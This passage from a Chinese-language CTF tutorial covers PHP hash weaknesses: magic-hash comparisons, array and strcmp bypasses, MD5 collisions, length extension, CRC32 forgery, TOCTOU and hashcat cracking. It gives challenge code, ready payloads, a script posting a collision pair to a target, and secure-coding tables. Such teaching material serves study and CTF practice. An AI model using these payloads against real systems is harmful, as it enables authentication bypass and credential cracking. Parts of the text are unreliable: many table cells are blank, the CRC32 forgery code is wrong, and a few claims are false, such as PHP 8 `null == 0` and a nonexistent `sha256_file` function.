print(f"CRC32(B): {zlib.crc32(data_b)}")
# CRC32 的 XOR 性质：CRC32(A XOR B) 与 CRC32(A) XOR CRC32(B) 有确定关系
```

 **新手避坑**：CRC32 在不同平台可能返回有符号整数或无符号整数。Python 的 `zlib.crc32()` 返回有符号，需 `& 0xFFFFFFFF` 转为无符号。

#### CRC32 多重碰撞与选择前缀碰撞

由于 CRC32 只有 32 位，生日攻击仅需约 2^16 次尝试即可找到一对碰撞：

```python
import zlib, random, string

def find_crc32_collision():
    """找到两个不同字符串的 CRC32 碰撞"""
    seen = {}
    for i in range(2**20):
        length = random.randint(4, 16)
        data = ''.join(random.choices(string.ascii_letters, k=length)).encode()
        h = zlib.crc32(data) & 0xFFFFFFFF
        if h in seen:
            print(f"[+] 碰撞: {seen[h]} 和 {data}")
            print(f"    CRC32 = {hex(h)}")
            return seen[h], data, h
        seen[h] = data
    return None

find_crc32_collision()
```

#### CRC32 与 MD5 安全特性对比

| 安全特性 | CRC32 | MD5 | SHA-256 |
|:--------:|:-----:|:---:|:-------:|
| 输出长度 | 32 bit | 128 bit | 256 bit |
| 碰撞抗性 |  极易（2^16） |  有实用碰撞（2^18） |  尚可 |
| 原像抗性 |  可枚举（2^32） |  理论可破 |  |
| 第二原像抗性 |  无 |  有实用攻击 |  |
| 线性性质 |  XOR 线性 |  |  |
| 是否为密码学哈希 |  |  已破 |  |
| 流密码相关 |  |  |  |
| 硬件加速 |  常用 CRC 指令集 |  部分 CPU |  SHA-NI |
| CTF 使用价值 | 绕过弱签名 | Magic Hash/碰撞 | 长度扩展 |

#### CRC32 在签名场景中的缺陷演示

```python
import zlib

def crc32_mac(secret: bytes, data: bytes) -> int:
    """模拟使用 CRC32 做 MAC 的漏洞场景"""
    return zlib.crc32(secret + data) & 0xFFFFFFFF

# 攻击者已知 secret 长度不知道内容，但可以构造 XOR 关系
secret = b"secret-key-16B"
msg1 = b"user=guest&admin=0"
msg2 = b"user=guest&admin=1"

mac1 = crc32_mac(secret, msg1)
print(f"MAC(guest): {hex(mac1)}")

# 通过 XOR 性质预测修改后的 MAC（不依赖 secret 内容）
xor_diff = zlib.crc32(msg2) ^ zlib.crc32(msg1) ^ 0xFFFFFFFF
predicted_mac2 = mac1 ^ xor_diff & 0xFFFFFFFF
mac2 = crc32_mac(secret, msg2)
print(f"MAC(admin) predicted: {hex(predicted_mac2)}")
print(f"MAC(admin) actual:   {hex(mac2)}")
```

 **新手避坑**：CRC32 在不同平台可能返回有符号整数或无符号整数。Python 的 `zlib.crc32()` 返回有符号，需 `& 0xFFFFFFFF` 转为无符号。CRC32 的 XOR 性质只在正确对齐的字节下成立，如果 secret 长度影响字节对齐则 XOR 预测可能失效。

---

### 攻击路径 F：TOCTOU 条件竞争

#### 【场景】文件哈希校验与使用之间存在时间差

```
第一步：检查文件哈希（校验通过）
          ↓ 时间窗口 ← 攻击者可在此处替换文件
第二步：使用文件内容（执行/解析）
```

```php
// 漏洞代码
$hash = md5_file($_FILES['file']['tmp_name']);
if ($hash !== $expected_hash) die('bad file');

// 重新打开文件处理，但此时文件可能已被替换！
$content = file_get_contents($_FILES['file']['tmp_name']);
```

#### TOCTOU 利用条件

| 条件 | 说明 |
|------|------|
| 存在时间窗口 | 校验与使用之间可插入操作 |
| 文件路径可预测 | tmp_name 已知或可控 |
| 竞态窗口足够大 | PHP 同步处理慢，或可循环触发 |
| 文件系统权限 | 攻击者可写入同一路径 |

#### 防御方法

```php
// 方法1：对同一文件描述符操作
$tmp = $_FILES['file']['tmp_name'];
$handle = fopen($tmp, 'rb');
$hash = md5_file($tmp);  // 或 fread + md5
// 立即使用 $handle 读取，不重新打开

// 方法2：移动到安全目录后再处理
$safe_path = '/tmp/safe/' . bin2hex(random_bytes(16));
move_uploaded_file($tmp, $safe_path);
// 现在处理 $safe_path
```

---

### 4.8 低熵 Token 深入

```php
$token = md5($username . time());
// 输入空间只有：已知用户名 + 几秒范围内的时间戳
```

常见低熵模式：

| Token 生成方式 | 有效熵 | 爆破可行性 | 建议替代方案 |
|:--------------|:------:|:----------:|:-------------|
| `md5(username . time())` | 秒级时间戳 ~30 bit | 秒级爆破 | `bin2hex(random_bytes(32))` |
| `md5(rand(0,999999))` | ~20 bit | 秒级 | `random_bytes(32)` |
| `md5(uniqid())` | 微秒 ~30 bit | 秒级 | `bin2hex(random_bytes(32))` |
| `substr(md5(time()),0,8)` | ~24 bit | 分钟级 | `random_bytes(16)` |
| `sha1(microtime())` | 微秒 ~30 bit | 秒级 | `bin2hex(random_bytes(32))` |
| `hash('crc32', $data)` | 32 bit | 即时碰撞 | 改用 SHA-256 |

 **新手避坑**：哈希输出长不代表输入空间大。如果输入只有时间戳+6位随机数，整个搜索空间只有 10^6 量级，暴力枚举几秒就能完成。

### 4.9 签名对象与解析对象不一致

危险流程：

```
签名/校验对象：原始 URL 编码字符串
        ↓
校验通过
        ↓
业务解析对象：URL 解码后的数据
```

常见差异：

| 场景 | 签名数据 | 解析数据 | 绕过方式 |
|:----|:---------|:---------|:---------|
| URL 参数 | `a%3D1` | `a=1` | 利用编码差异 |
| 重复参数 | 第一个值 | 最后一个值 | 追加同名参数 |
| JSON 键 | 保留全部 | 使用最后一个 | 重复键覆盖 |
| 大小写 | 原样签名 | 转换为小写 | 大小写差异 |
| 空白 | 前后保留 | 自动 trim | 尾随空白 |
| Base64 | 严格模式 | 宽松模式 | 无效字符被忽略 |

**安全原则**：签名和业务解析必须针对**同一组规范化后的精确字节**。

 **新手避坑**：签名校验通过不代表业务逻辑安全。如果签名的数据和最终处理的数据因编码、大小写、重复参数而产生差异，攻击者可以绕过签名验证篡改业务逻辑。

### 4.10 完整哈希算法对比表

| 属性 | MD5 | SHA-1 | SHA-256 | SHA-512 | bcrypt | Argon2id |
|:----:|:---:|:-----:|:-------:|:-------:|:------:|:--------:|
| 输出长度 | 128 bit | 160 bit | 256 bit | 512 bit | 184 bit+ | 变长 |
| 结构 | Merkle-Damgard | Merkle-Damgard | Merkle-Damgard | Merkle-Damgard | Blowfish | 内存硬 |
| 碰撞抗性 |  已破 |  已弱化 |  尚可 |  尚可 |  |  |
| 长度扩展 |  易受 |  易受 |  易受 |  易受 |  |  |
| GPU 加速 | 极快 | 快 | 快 | 快 | 很慢 | 很慢 |
| Hashcat 模式 | 0 | 100 | 1400 | 1700 | 3200 | - |
| 推荐用于密码 |  |  |  |  |  |  |
| CTF 常见度 |  |  |  |  |  |  |

### 4.11 在线爆破 vs 离线爆破

| 特性 | 在线爆破 | 离线爆破 |
|:----|:--------|:--------|
| 方式 | 逐一向服务器发送请求 | 本地计算哈希比较 |
| 速度 | 受网络延迟限制 | 仅受硬件限制 |
| 限制 | 验证码、IP 限速、锁定策略 | 无外部限制 |
| 是否可检测 | 是（日志可看到尝试） | 否 |
| 适用场景 | 测试弱口令、业务逻辑 | 已知哈希值、CTF 题目 |
| 彩虹表适用 | 否 | 是（无盐时） |

```python
# 离线爆破示例：6位数字 MD5
import hashlib, time

target = "e10adc3949ba59abbe56e057f20f883e"
start = time.time()
for i in range(1_000_000):
    digest = hashlib.md5(f"{i:06d}".encode()).hexdigest()
    if digest == target:
        print(f"Found: {i:06d}, time: {time.time()-start:.2f}s")
        break
```

---

## 四、Hashcat 密码爆破完整指南

### 4.1 Hashcat 模式速查

| 模式号 | 算法 | 类型 | CTF 常见场景 |
|:-----:|:----:|:----:|------------|
| 0 | MD5 | 哈希 | 最基础密码爆破 |
| 10 | md5($pass.$salt) | 哈希+盐 | 盐在后 |
| 20 | md5($salt.$pass) | 盐+哈希 | 盐在前 |
| 100 | SHA-1 | 哈希 | SHA-1 爆破 |
| 1400 | SHA-256 | 哈希 | SHA-256 爆破 |
| 1700 | SHA-512 | 哈希 | SHA-512 爆破 |
| 3200 | bcrypt | 密码哈希 | $2y$ 格式 |
| 16500 | JWT (HS256/384/512) | MAC | JWT 弱密钥爆破 |
| 11600 | 7-Zip | 压缩包 | 压缩包密码 |

### 4.2 Hashcat 攻击模式

| 模式 | 名称 | 参数 | 说明 |
|:----:|:----:|:----:|------|
| 0 | Straight（字典） | `-a 0` | 字典中每个词逐一尝试 |
| 1 | Combination（组合） | `-a 1` | 两个字典组合拼接 |
| 3 | Brute-force（掩码） | `-a 3` | 按字符集穷举 |
| 6 | Hybrid Wordlist + Mask | `-a 6` | 字典词+掩码后缀 |
| 7 | Hybrid Mask + Wordlist | `-a 7` | 掩码前缀+字典词 |

### 4.3 实用命令示例

```bash
# 字典攻击
hashcat -m 0 -a 0 hash.txt rockyou.txt

# 掩码攻击：6位数字
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# 字典+规则（常见变形）
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# 组合攻击：prefix + suffix
hashcat -m 0 -a 1 hash.txt prefix.txt suffix.txt

# 混合攻击：admin + 4位数字
hashcat -m 0 -a 6 hash.txt admin.txt ?d?d?d?d

# 查看已破解结果
hashcat -m 0 hash.txt --show

# 查看所有支持的哈希模式
hashcat --help | grep "MD5"
```

### 4.4 Hashcat 掩码字符集

| 占位符 | 含义 | 等价的字符 |
|:-----:|:----:|:---------:|
| `?d` | 数字 | `0123456789` |
| `?l` | 小写字母 | `abcdefghijklmnopqrstuvwxyz` |
| `?u` | 大写字母 | `ABCDEFGHIJKLMNOPQRSTUVWXYZ` |
| `?s` | 特殊符号 | `!"#$%&'()*+,-./:;<=>?@[\]^_{|}~`  |
| `?a` | 所有可打印字符 | `?l?u?d?s` |
| `?b` | 所有字节 0x00-0xFF | 暴力穷举所有字节 |
| `?1` | 自定义字符集 1 | `-1 ?l?d` 定义后使用 |

---

## 五、避坑汇总

| 编号 | 坑 | 正确做法 |
|:---:|----|---------|
| 1 | 看到 `md5()` 直接套 `0e` | 先确认比较符是 `==` 还是 `===` |
| 2 | `0e` 开头就以为是 Magic Hash | 确认 `e` 后**全是数字**，无字母 |
| 3 | PHP 版本不确认 | 同一 payload 在 PHP 7 和 8 可能不同 |
| 4 | 数组绕过在 PHP 8 通用 | PHP 8 会抛 TypeError，不返回 NULL |
| 5 | 双重哈希只看第一个 `0e` | 必须检查最终一次哈希的完整 32 位 |
| 6 | 碰撞 = 可以破解任意哈希 | 碰撞是找两个相同哈希，不是反推原像 |
| 7 | 长度扩展 = 万能 | 只适用于 `Hash(s\|\|m)` 结构 |
| 8 | `strcmp` 返回 0 才相等 | `!strcmp()` 实际判断返回值是否为 0 |
| 9 | `in_array` 默认严格比较 | 默认是 `==` 弱比较，需传 `true` 为严格 |
| 10 | 哈希看起来长就安全 | 输入空间小（时间戳+用户名）时仍可枚举 |
| 11 | JSON 传来的整数=相同字符串 | `json_decode` 会区分 `0` 和 `"0"`，类型不同 |
| 12 | CRC32 可以当安全签名 | CRC32 不是密码学哈希，有线性性质 |
| 13 | 文件校验后直接使用就安全 | 校验和读取之间可能有 TOCTOU 竞态 |
| 14 | `raw=true` 输出只是二进制 | 二进制中的特殊字符可能破坏 SQL 语句 |
| 15 | 所有哈希算法都受长度扩展影响 | SHA-3、BLAKE2 不受影响 |
| 16 | PHP 8 没有类型混淆问题 | `json_decode` 类型混淆在 `===` 下仍然有效 |
| 17 | 只看 payload 表不验证 | 在本地按题目实际编码和顺序验证后才使用 |
| 18 | `switch` 是强比较 | `switch` 使用 `==`，不是 `===` |

---

## 六、知识总结表

### 攻击类型速查

| 攻击类型 | 适用条件 | 比较符 | Payload 示例 | PHP 8 兼容 |
|---------|---------|:------:|-------------|:---------:|
| Magic Hash | `md5($a) == md5($b)` | `==` | `a=QNKCDZO&b=240610708` |  |
| 自身 Magic Hash | `$a == md5($a)` | `==` | `a=0e215962017` |  |
| 数组绕过 | `md5($a) === md5($b)` | `===` | `a[]=1&b[]=2` |  (抛异常) |
| strcmp 数组 | `!strcmp($pwd, $secret)` | 弱 | `password[]=x` |  (抛异常) |
| 真实碰撞 | `md5($a) === md5($b)` | `===` | 128 字节碰撞对 |  |
| 长度扩展 | `Hash(secret\|message)` | - | HashPump 构造 |  |
| 二进制注入 | `md5($x, true)` + SQL | - | `ffifdyop` |  |
| 截断哈希 | `substr(hash,0,6)` | - | 枚举碰撞 |  |
| JSON 类型混淆 | JSON 输入 + `==` 比较 | `==` | `{"token":0}` |  部分修复 |
| CRC32 碰撞 | `crc32()` 做签名 | - | 异或碰撞 |  |
| TOCTOU | 文件校验后重复打开 | - | 文件替换 |  |
| `in_array` 绕过 | 默认弱比较 | `==` | `role=0` |  部分修复 |

### PHP 版本差异速查

| 行为 | PHP 7 | PHP 8 |
|-----|:----:|:----:|
| `0 == "foo"` | `true` | `false` |
| `md5([])` 返回值 | `NULL` + Warning | `TypeError` 中断 |
| `strcmp([], "x")` 返回值 | `NULL` + Warning | `TypeError` 中断 |
| Magic Hash `0e==0e` | `true` | `true` |
| `"0" == 0` | `true` | `true` |
| `false == 0` | `true` | `true` |
| `0 == ""` | `true` | `false` |
| `0 == "0abc"` | `true` | `true` |
| `in_array(0, ["guest","admin"])` | `true` | `false` |

### 不同语言 PRNG 对比

| 语言 | 标准 PRNG | 安全 PRNG | 种子类型 | 周期 |
|:----:|:---------:|:---------:|:--------:|:----:|
| PHP | `mt_rand()` | `random_int()` | int（32 bit） | 2^19937 |
| PHP | `rand()` | `random_int()` | int（部分系统弱） | 2^31 |
| Python | `random.Random()` | `secrets` | 任意 hashable | 2^19937 |
| Java | `java.util.Random` | `SecureRandom` | long（48 bit） | 2^48 |
| JavaScript | `Math.random()` | `crypto.getRandomValues()` | 实现相关 | 变化 |

### Hashcat 常用模式速查

| 模式号 | 算法 | 适用场景 |
|:-----:|:----:|---------|
| 0 | MD5 | 通用哈希爆破 |
| 100 | SHA-1 | SHA-1 爆破 |
| 1400 | SHA-256 | SHA-256 爆破 |
| 1700 | SHA-512 | SHA-512 爆破 |
| 3200 | bcrypt ($2*$) | 高强度密码 |
| 5500 | NetNTLMv1 | Windows 认证 |
| 5600 | NetNTLMv2 | Windows 认证 |
| 16500 | JWT (HS256) | JWT 弱密钥 |

### 审计检查项

| 检查点 | 说明 |
|-------|------|
| `==` vs `===` | 弱比较才有 Magic Hash |
| 参数类型 | 数组、JSON 数字/布尔/null |
| PHP 版本 | 7 还是 8 决定数组绕过是否可用 |
| 加盐/前缀 | 可能破坏 Magic Hash |
| `raw=true` | 二进制输出，不适用 `0e` |
| 截断 | 缩小搜索空间 |
| MAC 构造 | 是否 `H(s||m)` 易受长度扩展 |
| 哈希算法 | MD5 有实用碰撞，SHA-256 没有 |
| 签名对象 vs 解析对象 | 编码/解码是否一致 |
| JSON 输入 | `json_decode` 后的类型是否被验证 |
| 文件操作 | 是否存在 TOCTOU 竞态 |
| CRC 使用 | 是否错误地用 CRC32 做安全签名 |
| `in_array`/`array_search` | 是否使用第三个参数 `true` |

### 快速验证命令

```bash
# 查看 PHP 版本
php -v

# 查看所有支持的哈希算法
php -r "print_r(hash_algos());"

# 本地 Magic Hash 验证
php -r "var_dump(md5('QNKCDZO') == md5('240610708'));"

# Hashcat 识别哈希类型
hashcat --identify '5f4dcc3b5aa765d61d8327deb882cf99'

# PHP 类型比较测试
php -r "var_dump(0 == 'foo');"
php -r "var_dump(in_array(0, ['admin','guest']));"

# Python CRC32 XOR 验证
python3 -c "import zlib; print(zlib.crc32(b'test') & 0xFFFFFFFF)"

# 在 PHP 中查看 int 溢出行为
php -r "var_dump(2147483647 + 1);"
```

---

## 七、PHP 与 JavaScript 类型对比（CTF 跨语言场景）

### 7.1 类型系统对比

| 方面 | PHP | JavaScript | 影响 |
|:----:|:---:|:----------:|:----:|
| 弱类型 |  |  | 相同问题 |
| `==` 类型转换 | 发生 | `==` 也转换 | 类似绕过可能 |
| 数组转字符串 | `Array` | `a,b,c` | PHP 8 抛异常 |
| JSON 解析 | `json_decode` | `JSON.parse` | 类型保留 |
| 数字限制 | PHP 8 前任意 | 64 位浮点 | 大数比较问题 |
| 字符串连接 | `.` | `+` | JS 中 `+` 也是加法 |
| 空值 | NULL | null/undefined | 比较规则不同 |

### 7.2 PHP 和 JS 的 JSON 类型差异

| JSON 值 | PHP `json_decode` | JS `JSON.parse` |
|:-------:|:-----------------:|:----------------:|
| `1` | int(1) | Number(1) |
| `"1"` | string("1") | String("1") |
| `true` | bool(true) | Boolean(true) |
| `null` | NULL | null |
| `[]` | array(0) | Array(0) |

---

## 八、完整例题库

### 8.1 例题一：Magic Hash 双参数

**题目源码**：
```php
<?php
$a = $_GET['a'] ?? '';
$b = $_GET['b'] ?? '';

if (!is_string($a) || !is_string($b)) {
    die('string only');
}

if ($a !== $b && md5($a) == md5($b)) {
    echo 'flag{example_flag}';
} else {
    echo 'failed';
}
?>
```

**分析**：
- `$a !== $b`：两个输入必须不同
- `md5($a) == md5($b)`：弱比较
- `is_string()` 阻止了数组绕过

**Payload**：`?a=QNKCDZO&b=240610708`

**验证链**：
```
md5('QNKCDZO')   = "0e830400451993494058024219903391" → 数字 0
md5('240610708') = "0e462097431906509019562988736854" → 数字 0
0 == 0 → true
```

### 8.2 例题二：自身 Magic Hash

**题目源码**：
```php
<?php
$input = $_GET['input'] ?? '';
if ($input == md5($input)) {
    echo $flag;
}
?>
```

**分析**：`$a == md5($a)` 要求输入自身等于自己的 MD5。

**Payload**：`?input=0e215962017`

**验证链**：
```
input        = "0e215962017" → 数字 0
md5(input)   = "0e291242476940776845150308577824" → 数字 0
0 == 0 → true
```

### 8.3 例题三：双重 MD5

**题目源码**：
```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
if ($a !== $b && md5(md5($a)) == md5(md5($b))) {
    echo $flag;
}
?>
```

**分析**：必须检查最终一次 md5 输出是否为 Magic Hash。不能只看第一次。

**验证脚本**：
```python
import hashlib, re
magic = re.compile(r"^0+e[0-9]+$", re.I)

candidates = [
    "CbDLytmyGm2xQyaLNhWn",
    "770hQgrBOjrcqftrlaZk",
]
for v in candidates:
    first = hashlib.md5(v.encode()).hexdigest()
    second = hashlib.md5(first.encode()).hexdigest()
    print(v, "→", second, "→", bool(magic.fullmatch(second)))
```

### 8.4 例题四：MD5 强碰撞

**题目源码**：
```php
<?php
$a = hex2bin($_POST['a'] ?? '');
$b = hex2bin($_POST['b'] ?? '');

if ($a === false || $b === false) {
    die('bad hex');
}

if ($a !== $b && md5($a) === md5($b)) {
    echo $flag;
}
?>
```

**分析**：
- 使用 `hex2bin()` 接收十六进制字符串
- 使用 `===` 强比较，Magic Hash 无效
- 必须使用真正的 MD5 碰撞对

**Payload**：提交已知的 MD5 碰撞十六进制串

```python
import requests

a_hex = "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
b_hex = "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"

data = {"a": a_hex, "b": b_hex}
r = requests.post("http://target/", data=data)
print(r.text)
```

### 8.5 例题五：长度扩展攻击

**场景**：MAC = SHA256(secret || data)，已知 data = "user=guest&admin=0"，已知对应 MAC。

**目标**：构造 data' = user=guest&admin=0||padding||&admin=1 和新的 MAC。

```python
import hashpumpy

original_hash = "已知的64位十六进制MAC"
original_data = b"user=guest&admin=0"
append_data = b"&admin=1"

for secret_len in range(1, 65):
    new_hash, new_data = hashpumpy.hashpump(
        original_hash, original_data, append_data, secret_len,
    )
    # 发送请求测试
```

### 8.6 例题六：ln_array 弱比较绕过

**题目源码**：
```php
<?php
$role = json_decode(file_get_contents('php://input'), true)['role'];
if (in_array($role, ['admin', 'guest'])) {
    echo $flag;
}
?>
```

**Payload (PHP 7)**：`{"role": 0}`

**分析**：
- `in_array` 默认第三个参数为 false，使用 `==` 比较
- `0 == 'admin'` → PHP 7 中为 `true`
- PHP 8 中已修复

### 8.7 例题七：strcmp 数组绕过

**题目源码**：
```php
<?php
$password = $_POST['password'] ?? '';
if (!strcmp($password, $secret)) {
    echo $flag;
}
?>
```

**Payload (PHP < 8)**：`password[]=x`

**分析**：PHP 7 中 `strcmp([])` 返回 NULL，`!NULL` 为 true。

---

## 九、常见 PHP 类型陷阱速查

### 9.1 类型转换陷阱

| 表达式 | PHP 7 结果 | PHP 8 结果 | 陷阱说明 |
|:------:|:---------:|:---------:|:--------:|
| `"abc" == 0` | true | false | 非数字字符串转 0 |
| `"123abc" == 123` | true | true | 前导数字提取 |
| `"" == 0` | true | false | 空字符串转 0 |
| `"0" == false` | true | true | 两者都转 bool |
| `"php" == 0` | true | false | 经典弱比较陷阱 |
| `null == 0` | true | false | null 转 0 |
| `null == ""` | true | true | null 转 "" |
| `null == false` | true | true | 都转 bool |
| `false == 0` | true | true | bool 转换 |

### 9.2 函数返回值陷阱

| 函数 | 正常返回值 | 异常返回值 | PHP 8 行为 |
|:----:|:---------:|:---------:|:---------:|
| `strcmp("a", "b")` | -1 或 1 | NULL（数组参数） | TypeError |
| `strpos("abc", "d")` | false（未找到） | false | 不变 |
| `substr("abc", 10)` | false | false | 不变 |
| `array_search("x", [])` | false | false | 不变 |
| `in_array("x", [])` | false | false | 不变 |

### 9.3 `strpos` 返回值判断陷阱

```php
//  危险写法：strpos 返回 0 表示在位置 0 找到
if (strpos($url, "http://") == false) {
    // 即使找到也会进入！（0 == false 为 true）
}

//  正确写法：必须使用 ===
if (strpos($url, "http://") === false) {
    // 只有真正没找到时才进入
}
```

| strpos 返回值 | `== false` | `=== false` |
|:------------:|:----------:|:-----------:|
| `0`（在位置 0 找到） | true（ 误判） | false（ 正确） |
| `false`（没找到） | true（正确） | true（正确） |
| `5`（在位置 5 找到） | false（正确） | false（正确） |

---

## 十、PHP 哈希安全纵深防御

### 10.1 不同哈希算法安全等级

| 算法 | 碰撞抗性 | 长度扩展 | CTF 安全评分 |
|:----:|:-------:|:--------:|:-----------:|
| MD5 |  已破解 |  易受攻击 |  |
| SHA-1 |  理论上破解 |  易受攻击 |  |
| SHA-256 |  仍安全 |  易受攻击 |  |
| SHA-512 |  仍安全 |  易受攻击 |  |
| SHA-3 |  仍安全 |  不受影响 |  |
| BLAKE2 |  仍安全 |  不受影响 |  |
| bcrypt |  |  不受影响 |  |
| Argon2 |  |  不受影响 |  |

### 10.2 安全编码对照表

| 危险写法 | 安全写法 | 说明 |
|:--------:|:--------:|:----:|
| `md5($a) == md5($b)` | `hash_equals(md5($a), md5($b))` | 使用严格比较 |
| `if (strcmp($a, $b) == 0)` | `if (hash_equals($a, $b))` | hash_equals 防时序攻击 |
| `in_array($role, $roles)` | `in_array($role, $roles, true)` | 第三个参数 true 开启严格模式 |
| `$data['key'] == $expected` | `is_string($data['key']) && hash_equals($data['key'], $expected)` | 先验类型再比较 |
| `switch ($type)` | 使用 `match` (PHP 8) 或 if-else | match 支持严格比较 |
| `$token = md5($username . time())` | `$token = bin2hex(random_bytes(32))` | 使用密码学安全的随机数 |
| `$mac = hash('sha256', $secret . $data)` | `$mac = hash_hmac('sha256', $data, $secret)` | 使用 HMAC |
| `$hash = md5($password)` | `$hash = password_hash($password, PASSWORD_DEFAULT)` | 使用 bcrypt/Argon2 |

### 10.3 编程语言哈希函数行为对比

| 语言 | MD5 函数 | SHA-256 函数 | HMAC 函数 | 安全比较 |
|:----:|:---------|:------------|:----------|:---------|
| PHP | `md5($s)` | `hash('sha256', $s)` | `hash_hmac('sha256', $s, $k)` | `hash_equals()` |
| Python | `hashlib.md5(s.encode()).hexdigest()` | `hashlib.sha256(s.encode()).hexdigest()` | `hmac.new(key, msg, hashlib.sha256).hexdigest()'` | `hmac.compare_digest()` |
| Java | `MessageDigest.getInstance("MD5")` | `MessageDigest.getInstance("SHA-256")` | `Mac.getInstance("HmacSHA256")` | `MessageDigest.isEqual()` |
| Go | `crypto/md5.Sum()` | `crypto/sha256.Sum256()` | `crypto/hmac.New(sha256.New, key)` | `hmac.Equal()` |
| Node.js | `crypto.createHash('md5')` | `crypto.createHash('sha256')` | `crypto.createHmac('sha256', key)` | `crypto.timingSafeEqual()` |

### 10.4 实战场景组合速查

| 场景 | PHP 版本 | 比较符 | 可用攻击 | 不可用 |
|:-----|:--------:|:------:|:---------|:-------|
| md5($a) == md5($b) | 7+ | `==` | Magic Hash | 数组绕过 |
| md5($a) === md5($b) | 5-7 | `===` | 数组绕过 | Magic Hash |
| md5($a) === md5($b) | 8 | `===` | 真实碰撞 | Magic Hash + 数组绕过 |
| $a == md5($a) | 7+ | `==` | 自身 Magic Hash | - |
| md5($a, true) 拼 SQL | 任意 | - | ffifdyop | 普通 Magic Hash |
| hash(secret.data) | 任意 | - | 长度扩展 | - |
| crc32(secret.data) | 任意 | - | CRC32 XOR | 长度扩展 |
| $data['key'] == $hash | 7 | `==` | JSON 类型混淆 | PHP 8 下受限 |
| in_array($r, $list) | 7 | 默认 `==` | 传 0 绕过 | PHP 8 下无效 |

### 10.5 20 个  新手避坑完整版

| # | 误区 | 正解 | 涉及章节 |
|:-:|:-----|:-----|:--------|
| 1 | 看到 md5 直接猜 0e | 先确认比较符和摘要格式 | 攻击路径A |
| 2 | 0e 开头 = Magic Hash | 必须 e 后全数字，无字母 | 攻击路径A |
| 3 | 数组绕过 PHP 8 也有效 | PHP 8 抛 TypeError 中断 | 攻击路径B |
| 4 | 双重哈希只看第一次 | 必须检查最终哈希是否 0e | 攻击路径A |
| 5 | 碰撞 = 破解任意哈希 | 碰撞只能找两个同哈希输入 | 攻击路径B |
| 6 | 长度扩展能破解 HMAC | 只适用于 Hash(secret\|message) | 攻击路径C |
| 7 | strcmp 返回 0 才相等 | !strcmp() 判断返回值是否为 0 | 攻击路径B |
| 8 | in_array 默认严格比较 | 默认弱比较，需传 true | 4.5 |
| 9 | 哈希长就安全 | 输入空间小仍可枚举 | 4.8 |
| 10 | JSON 整数 = 字符串 | json_decode 区分类型 | 4.3 |
| 11 | CRC32 可当安全签名 | 线性性质，2^16 可碰撞 | 攻击路径E |
| 12 | 文件校验后直接使用 | 存在 TOCTOU 竞态 | 攻击路径F |
| 13 | raw=true 只是二进制 | 特殊字符可破坏 SQL | 4.1 |
| 14 | 所有算法受长度扩展 | SHA-3/BLAKE2 不受影响 | 攻击路径C |
| 15 | PHP 8 修复所有类型混淆 | === 下 JSON 类型混淆仍有效 | 4.3 |
| 16 | switch 是强比较 | switch 使用 == | 4.5 |
| 17 | payload 表直接套用 | 本地按题目编码验证 | - |
| 18 | 加盐后不可破解 | 仍可对弱密码单次猜测 | 0.3 |
| 19 | hash_equals 修复长度扩展 | 只防时序，不防长度扩展 | 攻击路径C |
| 20 | 碰撞对能指定哈希值 | 碰撞对输出不可控 | 攻击路径B |

### 10.6 各攻击路径复杂度对比

| 攻击路径 | 前置知识 | 工具复杂度 | 成功率 | CTF 出现频率 |
|:--------:|:--------:|:----------:|:-----:|:-----------:|
| A: Magic Hash | 极低 | 无 | 高（条件满足时） |  |
| B: 数组绕过 | 低 | 无 | 中（PHP 7 下） |  |
| B: 真实碰撞 | 中 | FastColl/hashclash | 中 |  |
| C: 长度扩展 | 中 | HashPump/hash_extender | 中 |  |
| D: 二进制注入 | 低 | 无 | 高 |  |
| E: CRC32 碰撞 | 中 | Python zlib | 高 |  |
| F: TOCTOU | 中 | 多线程脚本 | 中 |  |
| JSON 混淆 | 低 | 无 | 中 |  |
| 截断哈希 | 低 | 枚举脚本 | 高（截断短时） |  |

### 10.7 PHP 8 新特性与安全影响

| 特性 | 安全影响 | 对 CTF 的影响 |
|:----|:---------|:-------------|
| 参数类型严格化 | 数组绕过失效 | `md5([])` 抛 TypeError |
| 非数字字符串不转 0 | `0 == "foo"` 为 false | JSON 混淆受限 |
| `match` 表达式 | 支持严格比较 `===` | switch 绕过减少 |
| 属性类型声明 | 类型更严格 | 限制减少 |
| WeakMaps | 内存安全 | 不直接影响 |

### 10.8 常见业务场景安全对照

| 业务场景 | 危险行为 | 推荐做法 |
|:--------|:---------|:---------|
| 用户密码存储 | `md5($password)` | `password_hash($password, PASSWORD_DEFAULT)` |
| API 签名 | `md5($secret.$data)` | `hash_hmac('sha256', $data, $secret)` |
| 文件完整性校验 | `crc32($file)` | `sha256_file($file)` |
| Token 生成 | `md5(time())` | `bin2hex(random_bytes(32))` |
| 临时令牌验证 | `strcmp($token, $expected)` | `hash_equals($token, $expected)` |
| 角色检查 | `in_array($role, $admins)` | `in_array($role, $admins, true)` |
| 数据类型校验 | `$data['count'] == 0` | `is_numeric($data['count']) && $data['count'] === 0` |
| 文件上传校验 | `md5_file($tmp)` 后 `file_get_contents($tmp)` | 在同一文件描述符上操作 |

### 10.9 CTF 解题刷题路线（PHP 哈希类）

| 难度 | 题目特征 | 练习方向 |
|:----:|:---------|:---------|
|  | Magic Hash 直接给 | 背 Magic Hash 表 |
|  | 自身 Magic Hash | `0e215962017` |
|  | 双重哈希 | 检查最终哈希 |
|  | 数组绕过 | PHP 5/7 差异 |
|  | 长度扩展 | HashPump 使用 |
|  | 真实碰撞 | FastColl 构造 |
|  | 综合 JSON+哈希 | 多层绕过组合 |

### 10.10 PHP 与 MySQL/MariaDB 哈希比较差异

| 表达式 | PHP 结果 | MySQL 结果 |
|:-------|:--------:|:----------:|
| `'0e123' = '0e456'` | `true (==)` / `false (===)` | `false`（字符串比较） |
| `'123abc' = 123` | `true (==)` | `true`（隐式转换） |
| `0 = 'abc'` | `true` (PHP 7) / `false` (PHP 8) | `true` |
